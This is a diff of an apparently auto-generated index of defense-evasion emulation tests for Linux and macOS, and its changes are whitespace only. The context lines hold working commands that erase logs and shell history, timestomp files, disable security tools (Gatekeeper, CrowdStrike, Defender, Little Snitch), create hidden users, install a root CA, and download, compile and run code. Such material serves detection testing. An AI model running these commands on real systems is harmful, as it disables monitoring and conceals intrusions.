@@ -651,7 +651,7 @@ defense-evasion:
       description: 'Changes a file or folder''s permissions using chmod and a specified
         numeric mode.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -667,14 +667,14 @@ defense-evasion:
       executor:
         command: 'chmod #{numeric_mode} #{file_or_folder}
 
-          '
+'
         name: sh
     - name: chmod - Change file or folder mode (symbolic mode)
       auto_generated_guid: fc9d6695-d022-4a80-91b1-381f5c35aff3
       description: 'Changes a file or folder''s permissions using chmod and a specified
         symbolic mode.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -690,14 +690,14 @@ defense-evasion:
       executor:
         command: 'chmod #{symbolic_mode} #{file_or_folder}
 
-          '
+'
         name: sh
     - name: chmod - Change file or folder mode (numeric mode) recursively
       auto_generated_guid: ea79f937-4a4d-4348-ace6-9916aec453a4
       description: 'Changes a file or folder''s permissions recursively using chmod
         and a specified numeric mode.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -713,14 +713,14 @@ defense-evasion:
       executor:
         command: 'chmod -R #{numeric_mode} #{file_or_folder}
 
-          '
+'
         name: sh
     - name: chmod - Change file or folder mode (symbolic mode) recursively
       auto_generated_guid: 0451125c-b5f6-488f-993b-5a32b09f7d8f
       description: 'Changes a file or folder''s permissions recursively using chmod
         and a specified symbolic mode.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -736,14 +736,14 @@ defense-evasion:
       executor:
         command: 'chmod -R #{symbolic_mode} #{file_or_folder}
 
-          '
+'
         name: bash
     - name: chown - Change file or folder ownership and group
       auto_generated_guid: d169e71b-85f9-44ec-8343-27093ff3dfc0
       description: 'Changes a file or folder''s ownership and group information using
         chown.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -763,14 +763,14 @@ defense-evasion:
       executor:
         command: 'chown #{owner}:#{group} #{file_or_folder}
 
-          '
+'
         name: bash
     - name: chown - Change file or folder ownership and group recursively
       auto_generated_guid: b78598be-ff39-448f-a463-adbf2a5b7848
       description: 'Changes a file or folder''s ownership and group information recursively
         using chown.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -790,13 +790,13 @@ defense-evasion:
       executor:
         command: 'chown -R #{owner}:#{group} #{file_or_folder}
 
-          '
+'
         name: bash
     - name: chown - Change file or folder mode ownership only
       auto_generated_guid: 967ba79d-f184-4e0e-8d09-6362b3162e99
       description: 'Changes a file or folder''s ownership only using chown.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -812,13 +812,13 @@ defense-evasion:
       executor:
         command: 'chown #{owner} #{file_or_folder}
 
-          '
+'
         name: sh
     - name: chown - Change file or folder ownership recursively
       auto_generated_guid: 3b015515-b3d8-44e9-b8cd-6fa84faf30b2
       description: 'Changes a file or folder''s ownership only recursively using chown.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -834,7 +834,7 @@ defense-evasion:
       executor:
         command: 'chown -R #{owner} #{file_or_folder}
 
-          '
+'
         name: bash
     - name: chattr - Remove immutable file attribute
       auto_generated_guid: e7469fe2-ad41-4382-8965-99b94dd3c13f
@@ -852,13 +852,13 @@ defense-evasion:
       executor:
         command: 'chattr -i #{file_to_modify}
 
-          '
+'
         name: sh
     - name: Chmod through c script
       auto_generated_guid: 973631cf-6680-4ffa-a053-045e1b6b67ab
       description: 'chmods a file using a c script
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -875,13 +875,13 @@ defense-evasion:
       dependencies:
       - description: 'Compile the script from (#{source_file}). Destination is #{compiled_file}
 
-          '
+'
         prereq_command: 'gcc #{source_file} -o #{compiled_file}
 
-          '
+'
         get_prereq_command: 'gcc #{source_file} -o #{compiled_file}
 
-          '
+'
       executor:
         command: "#{compiled_file} /tmp/ T1222002\n"
         name: sh
@@ -889,7 +889,7 @@ defense-evasion:
       auto_generated_guid: 18592ba1-5f88-4e3c-abc8-ab1c6042e389
       description: 'chowns a file to root using a c script
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -906,17 +906,17 @@ defense-evasion:
       dependencies:
       - description: 'Compile the script from (#{source_file}). Destination is #{compiled_file}
 
-          '
+'
         prereq_command: 'gcc #{source_file} -o #{compiled_file}
 
-          '
+'
         get_prereq_command: 'gcc #{source_file} -o #{compiled_file}
 
-          '
+'
       executor:
         command: 'sudo #{compiled_file} #{source_file}
 
-          '
+'
         name: sh
         elevation_required: true
   T1216.001:
@@ -1626,7 +1626,7 @@ defense-evasion:
       auto_generated_guid: 150c3a08-ee6e-48a6-aeaf-3659d24ceb4e
       description: 'Common Sudo enumeration methods.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -1640,7 +1640,7 @@ defense-evasion:
         This is dangerous to modify without using ''visudo'', do not do this on a
         production system.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -1655,7 +1655,7 @@ defense-evasion:
       description: 'Sets sudo caching tty_tickets value to disabled. This is dangerous
         to modify without using ''visudo'', do not do this on a production system.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -2061,7 +2061,7 @@ defense-evasion:
       description: 'Create and execute a process from a directory masquerading as
         the current parent directory (`...` instead of normal `..`)
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -2552,7 +2552,7 @@ defense-evasion:
         the system. If it''s a virtual machine, one of the device manufacturer will
         be a Virtualization Software.
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -2562,7 +2562,7 @@ defense-evasion:
           ''Oracle|VirtualBox|VMWare|Parallels'') then echo ''Virtualization Environment
           detected''; fi;
 
-          '
+'
     - name: Detect Virtualization Environment using sysctl (hw.model)
       auto_generated_guid: 6beae646-eb4c-4730-95be-691a4094408c
       description: |
@@ -2576,7 +2576,7 @@ defense-evasion:
         command: 'if [ "$(sysctl -n hw.model | grep -v ''Mac'')" != "" ]; then echo
           ''Virtualization Environment detected''; fi;
 
-          '
+'
     - name: Check if System Integrity Protection is enabled
       auto_generated_guid: 2b73cd9b-b2fb-4357-b9d7-c73c41d9e945
       description: "The latest versions of macOS have the System Integrity Protection
@@ -2590,7 +2590,7 @@ defense-evasion:
         command: 'if [ "$(csrutil status | grep -v ''enabled'')" != "" ]; then echo
           ''Possible Virtualization Environment detected''; fi;
 
-          '
+'
     - name: Detect Virtualization Environment using system_profiler
       auto_generated_guid: e04d2e89-de15-4d90-92f9-a335c7337f0f
       description: "system_profiler provides system hardware and software configuration
@@ -2605,7 +2605,7 @@ defense-evasion:
           | grep -v ''Mac'')" != "" ]; then echo ''Virtualization Environment detected'';
           fi;
 
-          '
+'
   T1070.002:
     technique:
       type: attack-pattern
@@ -2656,7 +2656,7 @@ defense-evasion:
       auto_generated_guid: 989cc1b1-3642-4260-a809-54f9dd559683
       description: 'Delete system and audit logs
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -2675,11 +2675,11 @@ defense-evasion:
       dependencies:
       - description: 'target files must exist
 
-          '
+'
         prereq_command: 'if [ -d /var/audit ] ; then stat #{macos_audit_path} ; fi
           && stat #{syslog_path}
 
-          '
+'
         get_prereq_command: |
           touch #{syslog_path}
           if [ -d /var/audit ] ; then touch #{macos_audit_path} ; fi
@@ -2694,7 +2694,7 @@ defense-evasion:
       description: 'This test deletes main log datastore, inflight log data, time-to-live
         data(TTL), fault and error content
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -2709,7 +2709,7 @@ defense-evasion:
         with (-s 0) parameter which sets file size to zero, thus emptying the file
         content
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -2721,17 +2721,17 @@ defense-evasion:
       dependencies:
       - description: 'target files must exist
 
-          '
+'
         prereq_command: 'stat #{system_log_path}
 
-          '
+'
         get_prereq_command: 'touch #{system_log_path}
 
-          '
+'
       executor:
         command: 'sudo truncate -s 0 #{system_log_path} #size parameter shorthand
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Delete log files via cat utility by appending /dev/null or /dev/zero
@@ -2740,7 +2740,7 @@ defense-evasion:
         and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero,
         using cat utility
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -2752,13 +2752,13 @@ defense-evasion:
       dependencies:
       - description: 'target files must exist
 
-          '
+'
         prereq_command: 'stat #{system_log_path}
 
-          '
+'
         get_prereq_command: 'touch #{system_log_path}
 
-          '
+'
       executor:
         command: |
           sudo cat /dev/null > #{system_log_path} #truncating the file to zero bytes
@@ -2770,7 +2770,7 @@ defense-evasion:
       description: 'This test finds and deletes the system log files within /var/log/
         directory using various executions(rm, shred, unlink)
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -2790,15 +2790,15 @@ defense-evasion:
       dependencies:
       - description: 'target files must exist
 
-          '
+'
         prereq_command: 'stat /var/log/#{system_log_name1} /var/log/#{system_log_name2}
           /var/log/#{system_log_name3}
 
-          '
+'
         get_prereq_command: 'touch /var/log/#{system_log_name1} /var/log/#{system_log_name2}
           /var/log/#{system_log_name3}
 
-          '
+'
       executor:
         command: |
           sudo find /var/log -name '#{system_log_name1}*' -exec rm {} \; #using "rm" execution
@@ -2811,7 +2811,7 @@ defense-evasion:
       description: 'This test overwrites the contents of system log file with an empty
         string using echo utility
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -2822,7 +2822,7 @@ defense-evasion:
       executor:
         command: 'sudo echo '''' > #{system_log_path}
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Real-time system log clearance/deletion
@@ -2830,20 +2830,20 @@ defense-evasion:
       description: 'This test reads real-time system log file and writes empty string
         to it, thus clearing the log file without tampering with the logging process
 
-        '
+'
       supported_platforms:
       - macos
       executor:
         command: 'sudo log -f /var/log/system.log | : > /var/log/system.log
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Delete system log files via unlink utility
       auto_generated_guid: 03013b4b-01db-437d-909b-1fdaa5010ee8
       description: 'This test deletes the system log file using unlink utility
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -2855,17 +2855,17 @@ defense-evasion:
       dependencies:
       - description: 'target files must exist
 
-          '
+'
         prereq_command: 'stat #{system_log_path}
 
-          '
+'
         get_prereq_command: 'touch #{system_log_path}
 
-          '
+'
       executor:
         command: 'sudo unlink #{system_log_path}
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Delete system log files using shred utility
@@ -2873,7 +2873,7 @@ defense-evasion:
       description: 'This test overwrites the contents of the log file with zero bytes(-z)
         using three passes(-n 3) of data, and then delete the file(-u) securely
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -2885,17 +2885,17 @@ defense-evasion:
       dependencies:
       - description: 'target files must exist
 
-          '
+'
         prereq_command: 'stat #{system_log_path}
 
-          '
+'
         get_prereq_command: 'touch #{system_log_path}
 
-          '
+'
       executor:
         command: 'sudo shred -u -z -n 3 #{system_log_path}
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Delete system log files using srm utility
@@ -2919,14 +2919,14 @@ defense-evasion:
       dependencies:
       - description: 'target files must exist
 
-          '
+'
         prereq_command: 'stat #{system_log_path} #{system_log_folder}
 
-          '
+'
         get_prereq_command: 'mkdir -p #{system_log_folder} && touch #{system_log_path}
           #{system_log_folder}/system.log
 
-          '
+'
       executor:
         command: |
           sudo srm #{system_log_path} #system log file deletion
@@ -2939,7 +2939,7 @@ defense-evasion:
         shell script"(sh/bash by default) which in-turn spawns rm utility, requires
         admin privileges
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -2951,18 +2951,18 @@ defense-evasion:
       dependencies:
       - description: 'target files must exist
 
-          '
+'
         prereq_command: 'stat #{system_log_path}
 
-          '
+'
         get_prereq_command: 'touch #{system_log_path}
 
-          '
+'
       executor:
         command: 'osascript -e ''do shell script "rm #{system_log_path}" with administrator
           privileges''
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Delete system log files using Applescript
@@ -2982,17 +2982,17 @@ defense-evasion:
       dependencies:
       - description: 'target files must exist
 
-          '
+'
         prereq_command: 'stat #{system_log_path}
 
-          '
+'
         get_prereq_command: 'touch #{system_log_path}
 
-          '
+'
       executor:
         command: 'osascript -e ''tell application "Finder" to delete POSIX file "#{system_log_path}"''
 
-          '
+'
         name: sh
         elevation_required: true
   T1218.004:
@@ -3287,7 +3287,7 @@ defense-evasion:
       auto_generated_guid: fb3d46c6-9480-4803-8d7d-ce676e1f1a9b
       description: 'Gatekeeper Bypass via command line
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -3298,7 +3298,7 @@ defense-evasion:
       executor:
         command: 'xattr -d com.apple.quarantine #{app_path}
 
-          '
+'
         name: sh
   T1553.002:
     technique:
@@ -3868,7 +3868,7 @@ defense-evasion:
       auto_generated_guid: a934276e-2be5-4a36-93fd-98adbb5bd4fc
       description: 'Clears bash history via rm
 
-        '
+'
       input_arguments:
         history_path:
           description: Bash history path
@@ -3880,13 +3880,13 @@ defense-evasion:
       executor:
         command: 'rm #{history_path}
 
-          '
+'
         name: sh
     - name: Clear Bash history (cat dev/null)
       auto_generated_guid: b1251c35-dcd3-4ea1-86da-36d27b54f31f
       description: 'Clears bash history via cat /dev/null
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -3898,13 +3898,13 @@ defense-evasion:
       executor:
         command: 'cat /dev/null > #{history_path}
 
-          '
+'
         name: sh
     - name: Clear Bash history (ln dev/null)
       auto_generated_guid: 23d348f3-cc5c-4ba9-bd0a-ae09069f0914
       description: 'Clears bash history via a symlink to /dev/null
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -3916,14 +3916,14 @@ defense-evasion:
       executor:
         command: 'ln -sf /dev/null #{history_path}
 
-          '
+'
         name: sh
     - name: Clear history of a bunch of shells
       auto_generated_guid: 7e6721df-5f08-4370-9255-f06d8a77af4c
       description: 'Clears the history of a bunch of different shell types by setting
         the history size to zero
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -3938,7 +3938,7 @@ defense-evasion:
       description: 'Clears the history and disable bash history logging of the current
         shell and future shell sessions
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -3958,7 +3958,7 @@ defense-evasion:
       description: 'Using a space before a command causes the command to not be logged
         in the Bash History file
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -4100,7 +4100,7 @@ defense-evasion:
       description: 'Use Python to decode a base64-encoded text string and echo it
         to the console
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -4116,13 +4116,13 @@ defense-evasion:
       dependencies:
       - description: 'Python must be present
 
-          '
+'
         prereq_command: 'which python3
 
-          '
+'
         get_prereq_command: 'echo "Please install Python 3"
 
-          '
+'
       executor:
         name: sh
         elevation_required: false
@@ -4153,13 +4153,13 @@ defense-evasion:
       dependencies:
       - description: 'Perl must be present
 
-          '
+'
         prereq_command: 'which perl
 
-          '
+'
         get_prereq_command: 'echo "Please install Perl"
 
-          '
+'
       executor:
         name: sh
         elevation_required: false
@@ -4173,7 +4173,7 @@ defense-evasion:
       description: 'Use common shell utilities to decode a base64-encoded text string
         and echo it to the console
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -4204,7 +4204,7 @@ defense-evasion:
       description: 'Use common shell utilities to decode a hex-encoded text string
         and echo it to the console
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -4220,13 +4220,13 @@ defense-evasion:
       dependencies:
       - description: 'xxd must be present
 
-          '
+'
         prereq_command: 'which xxd
 
-          '
+'
         get_prereq_command: 'echo "Please install xxd"
 
-          '
+'
       executor:
         name: sh
         elevation_required: false
@@ -4270,13 +4270,13 @@ defense-evasion:
       dependencies:
       - description: 'base64 must be present
 
-          '
+'
         prereq_command: 'which base64
 
-          '
+'
         get_prereq_command: 'echo "please install base64"
 
-          '
+'
       executor:
         name: sh
         elevation_required: false
@@ -4312,7 +4312,7 @@ defense-evasion:
           text, key: "".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()),
           key)]); command = "#{encrypted_command}"; key = "#{xor_key}"; exec = xor_decrypt(command,
           key); subprocess.call(exec, shell=True)'''
-        cleanup_command:
+        cleanup_command: 
         name: bash
         elevation_required: false
   T1562:
@@ -4565,7 +4565,7 @@ defense-evasion:
       auto_generated_guid: 3824130e-a6e4-4528-8091-3a52eeb540f6
       description: 'Copies and deletes mail data on macOS
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -4575,14 +4575,14 @@ defense-evasion:
           rm -rf ~/Library/Mail/copy/*
         cleanup_command: 'rm -rf ~/Library/Mail/copy
 
-          '
+'
         name: bash
         elevation_required: true
     - name: Copy and Modify Mailbox Data on macOS
       auto_generated_guid: 8a0b1579-5a36-483a-9cde-0236983e1665
       description: 'Copies and modifies mail data on macOS
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -4592,7 +4592,7 @@ defense-evasion:
           echo "Manipulated data" > ~/Library/Mail/copy/manipulated.txt
         cleanup_command: 'rm -rf ~/Library/Mail/copy
 
-          '
+'
         name: bash
         elevation_required: true
   T1055:
@@ -4879,7 +4879,7 @@ defense-evasion:
       auto_generated_guid: 5f9113d5-ed75-47ed-ba23-ea3573d05810
       description: 'Stomps on the access timestamp of a file
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -4891,26 +4891,26 @@ defense-evasion:
       dependencies:
       - description: 'The file must exist in order to be timestomped
 
-          '
+'
         prereq_command: 'test -e #{target_filename} && exit 0 || exit 1
 
-          '
+'
         get_prereq_command: 'echo ''T1070.006 file access timestomp test'' > #{target_filename}
 
-          '
+'
       executor:
         command: 'touch -a -t 197001010000.00 #{target_filename}
 
-          '
+'
         cleanup_command: 'rm -f #{target_filename}
 
-          '
+'
         name: sh
     - name: Set a file's modification timestamp
       auto_generated_guid: 20ef1523-8758-4898-b5a2-d026cc3d2c52
       description: 'Stomps on the modification timestamp of a file
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -4922,21 +4922,21 @@ defense-evasion:
       dependencies:
       - description: 'The file must exist in order to be timestomped
 
-          '
+'
         prereq_command: 'test -e #{target_filename} && exit 0 || exit 1
 
-          '
+'
         get_prereq_command: 'echo ''T1070.006 file modification timestomp test'' >
           #{target_filename}
 
-          '
+'
       executor:
         command: 'touch -m -t 197001010000.00 #{target_filename}
 
-          '
+'
         cleanup_command: 'rm -f #{target_filename}
 
-          '
+'
         name: sh
     - name: Set a file's creation timestamp
       auto_generated_guid: 8164a4a6-f99c-4661-ac4f-80f5e4e78d2b
@@ -4963,7 +4963,7 @@ defense-evasion:
           stat #{target_filename}
         cleanup_command: 'rm -f #{target_filename}
 
-          '
+'
         name: sh
     - name: Modify file timestamps using reference file
       auto_generated_guid: 631ea661-d661-44b0-abdb-7a7f3fc08e50
@@ -4989,21 +4989,21 @@ defense-evasion:
           touch -acmr #{reference_file_path} #{target_file_path}
         cleanup_command: 'rm -f #{target_file_path}
 
-          '
+'
         name: sh
     - name: MacOS - Timestomp Date Modified
       auto_generated_guid: 87fffff4-d371-4057-a539-e3b24c37e564
       description: 'Stomps on the modification timestamp of a file using MacOS''s
         SetFile utility
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
         target_filename:
           description: 'Path of file that we are going to stomp on last modified time
 
-            '
+'
           type: path
           default: "/tmp/T1070.006-modified.txt"
         target_date:
@@ -5013,22 +5013,22 @@ defense-evasion:
       dependencies:
       - description: 'The file must exist in order to be timestomped
 
-          '
+'
         prereq_command: 'test -e #{target_filename} && exit 0 || exit 1
 
-          '
+'
         get_prereq_command: 'echo ''T1070.006 MacOS file modified timestomp test''
           > #{target_filename}
 
-          '
+'
       executor:
         name: sh
         command: 'SetFile -m #{target_date} #{target_filename}
 
-          '
+'
         cleanup_command: 'rm -f #{target_filename}
 
-          '
+'
   T1620:
     technique:
       type: attack-pattern
@@ -5297,7 +5297,7 @@ defense-evasion:
       description: 'Uses the ping command to introduce a delay before executing a
         malicious payload.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -6635,13 +6635,13 @@ defense-evasion:
       dependencies:
       - description: 'The binary must exist on disk at specified location (#{file_to_pad})
 
-          '
+'
         prereq_command: 'if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;
 
-          '
+'
         get_prereq_command: 'cp /bin/ls #{file_to_pad}
 
-          '
+'
       executor:
         command: |
           dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes
@@ -6649,7 +6649,7 @@ defense-evasion:
           dd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data
         cleanup_command: 'rm #{file_to_pad}
 
-          '
+'
         name: sh
     - name: Pad Binary to Change Hash using truncate command - Linux/macOS
       auto_generated_guid: e22a9e89-69c7-410f-a473-e6c212cd2292
@@ -6669,20 +6669,20 @@ defense-evasion:
       dependencies:
       - description: 'The binary must exist on disk at specified location (#{file_to_pad})
 
-          '
+'
         prereq_command: 'if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;
 
-          '
+'
         get_prereq_command: 'cp /bin/ls #{file_to_pad}
 
-          '
+'
       executor:
         command: 'truncate -s +1 #{file_to_pad} #adds a byte to the file size
 
-          '
+'
         cleanup_command: 'rm #{file_to_pad}
 
-          '
+'
         name: sh
   T1484.001:
     technique:
@@ -6954,7 +6954,7 @@ defense-evasion:
       auto_generated_guid: 4d66029d-7355-43fd-93a4-b63ba92ea1be
       description: 'injects a dylib that opens calculator via env variable
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -6975,17 +6975,17 @@ defense-evasion:
       dependencies:
       - description: 'Compile the dylib from (#{source_file}). Destination is #{dylib_file}
 
-          '
+'
         prereq_command: 'gcc -dynamiclib #{source_file} -o #{dylib_file}
 
-          '
+'
         get_prereq_command: 'gcc -dynamiclib #{source_file} -o #{dylib_file}
 
-          '
+'
       executor:
         command: 'DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}
 
-          '
+'
         cleanup_command: |
           kill `pgrep Calculator`
           kill `pgrep firefox`
@@ -7371,7 +7371,7 @@ defense-evasion:
       description: 'Make, change owner, and change file attributes on a C source code
         file
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -7397,7 +7397,7 @@ defense-evasion:
       auto_generated_guid: 759055b3-3885-4582-a8ec-c00c9d64dd79
       description: 'This test sets the SetUID flag on a file in FreeBSD.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -7413,14 +7413,14 @@ defense-evasion:
           sudo chmod u+xs #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Set a SetGID flag on file
       auto_generated_guid: db55f666-7cba-46c6-9fe6-205a05c3242c
       description: 'This test sets the SetGID flag on a file in Linux and macOS.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -7436,7 +7436,7 @@ defense-evasion:
           sudo chmod g+xs #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
 
-          '
+'
         name: sh
         elevation_required: true
   T1218.008:
@@ -8480,7 +8480,7 @@ defense-evasion:
       auto_generated_guid: 394a538e-09bb-4a4a-95d1-b93cf12682a8
       description: 'Modify MacOS plist file in one of two directories
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -9390,7 +9390,7 @@ defense-evasion:
       description: 'Add a hidden user on macOS using Unique ID < 500 (users with that
         ID are hidden by default)
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -9401,17 +9401,17 @@ defense-evasion:
       executor:
         command: 'sudo dscl . -create /Users/#{user_name} UniqueID 333
 
-          '
+'
         cleanup_command: 'sudo dscl . -delete /Users/#{user_name}
 
-          '
+'
         elevation_required: true
         name: sh
     - name: Create Hidden User using IsHidden option
       auto_generated_guid: de87ed7b-52c3-43fd-9554-730f695e7f31
       description: 'Add a hidden user on macOS using IsHidden optoin
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -9422,10 +9422,10 @@ defense-evasion:
       executor:
         command: 'sudo dscl . -create /Users/#{user_name} IsHidden 1
 
-          '
+'
         cleanup_command: 'sudo dscl . -delete /Users/#{user_name}
 
-          '
+'
         elevation_required: true
         name: sh
   T1134.003:
@@ -9566,7 +9566,7 @@ defense-evasion:
       auto_generated_guid: 4eafdb45-0f79-4d66-aa86-a3e2c08791f5
       description: 'Disables history collection in shells
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -10472,7 +10472,7 @@ defense-evasion:
       auto_generated_guid: 8fba7766-2d11-4b4a-979a-1e3d9cc9a88c
       description: 'Disables Carbon Black Response
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -10488,48 +10488,48 @@ defense-evasion:
       auto_generated_guid: 62155dd8-bb3d-4f32-b31c-6532ff3ac6a3
       description: 'Disables LittleSnitch
 
-        '
+'
       supported_platforms:
       - macos
       executor:
         command: 'sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
 
-          '
+'
         cleanup_command: 'sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Disable OpenDNS Umbrella
       auto_generated_guid: 07f43b33-1e15-4e99-be70-bc094157c849
       description: 'Disables OpenDNS Umbrella
 
-        '
+'
       supported_platforms:
       - macos
       executor:
         command: 'sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
 
-          '
+'
         cleanup_command: 'sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Disable macOS Gatekeeper
       auto_generated_guid: 2a821573-fb3f-4e71-92c3-daac7432f053
       description: 'Disables macOS Gatekeeper
 
-        '
+'
       supported_platforms:
       - macos
       executor:
         command: 'sudo spctl --master-disable
 
-          '
+'
         cleanup_command: 'sudo spctl --master-enable
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Stop and unload Crowdstrike Falcon on macOS
@@ -10537,7 +10537,7 @@ defense-evasion:
       description: 'Stop and unload Crowdstrike Falcon daemons falcond and userdaemon
         on macOS
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -10569,17 +10569,17 @@ defense-evasion:
         Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide
         https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide
 
-        '
+'
       supported_platforms:
       - linux
       - macos
       executor:
         command: 'sudo mdatp config real-time-protection --value disabled
 
-          '
+'
         cleanup_command: 'sudo mdatp config real-time-protection --value enabled
 
-          '
+'
         name: sh
         elevation_required: true
   T1601:
@@ -11067,10 +11067,10 @@ defense-evasion:
       dependencies:
       - description: 'encode the command into base64 file
 
-          '
+'
         prereq_command: 'if [ -e "/tmp/encoded.dat" ]; then exit 0; else exit 1; fi
 
-          '
+'
         get_prereq_command: |
           if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64encode -r -"; else cmd="base64"; fi;
           echo "#{shell_command}" | $cmd > /tmp/encoded.dat
@@ -12122,7 +12122,7 @@ defense-evasion:
       auto_generated_guid: cc4a0b8c-426f-40ff-9426-4e10e5bf4c49
       description: 'Creates a root CA with openssl
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -12138,10 +12138,10 @@ defense-evasion:
       dependencies:
       - description: 'Verify the certificate exists. It generates if not on disk.
 
-          '
+'
         prereq_command: 'if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;
 
-          '
+'
         get_prereq_command: |
           if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;
           openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
@@ -12149,7 +12149,7 @@ defense-evasion:
         command: 'sudo security add-trusted-cert -d -r trustRoot -k "/Library/Keychains/System.keychain"
           "#{cert_filename}"
 
-          '
+'
         name: sh
         elevation_required: true
   T1027.004:
@@ -12212,7 +12212,7 @@ defense-evasion:
       description: 'Compile a c file with either gcc or clang on FreeBSD, Linux or
         Macos.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -12225,14 +12225,14 @@ defense-evasion:
       dependencies:
       - description: 'the source file must exist on disk at specified location (#{input_file})
 
-          '
+'
         prereq_command: 'if [ -e  #{input_file} ]; then exit 0; else exit 1; fi
 
-          '
+'
         get_prereq_command: 'wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c
           -O "#{input_file}"
 
-          '
+'
       executor:
         command: |
           gcc #{input_file} && ./a.out
@@ -12243,7 +12243,7 @@ defense-evasion:
       description: 'Compile a c file with either gcc or clang on FreeBSD, Linux or
         Macos.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -12256,14 +12256,14 @@ defense-evasion:
       dependencies:
       - description: 'the source file must exist on disk at specified location (#{input_file})
 
-          '
+'
         prereq_command: 'if [ -e  #{input_file} ]; then exit 0; else exit 1; fi
 
-          '
+'
         get_prereq_command: 'wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc
           -O #{input_file}
 
-          '
+'
       executor:
         command: |
           g++ #{input_file} && ./a.out
@@ -12273,7 +12273,7 @@ defense-evasion:
       auto_generated_guid: 78bd3fa7-773c-449e-a978-dc1f1500bc52
       description: 'Compile a go file with golang on FreeBSD, Linux or Macos.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -12286,18 +12286,18 @@ defense-evasion:
       dependencies:
       - description: 'the source file must exist on disk at specified location (#{input_file})
 
-          '
+'
         prereq_command: 'if [ -e  #{input_file} ]; then exit 0; else exit 1; fi
 
-          '
